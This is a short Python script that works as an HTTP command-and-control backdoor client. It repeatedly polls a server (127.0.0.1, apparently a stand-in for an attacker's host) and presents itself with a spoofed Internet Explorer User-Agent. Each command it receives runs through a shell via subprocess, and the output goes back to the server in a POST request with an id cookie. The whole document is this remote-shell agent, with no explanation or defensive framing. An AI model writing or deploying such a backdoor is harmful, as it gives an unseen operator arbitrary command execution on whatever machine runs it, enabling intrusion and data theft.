import requests   
import subprocess 
import time
import os

while True: 

    req = requests.get('http://127.0.0.1', headers={"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"})     
    command = req.text                             
    print("command is:", command)

    CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    result = CMD.stdout.read()
    print("result is:", result)
    post_response = requests.post(url='http://127.0.0.1', headers={"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"}, data=result, cookies={"id":"1"}) 
    print("sent!")
    # post_response = requests.post(url='http://127.0.0.1', data=CMD.stderr.read())  <- error handling
    time.sleep(3)
       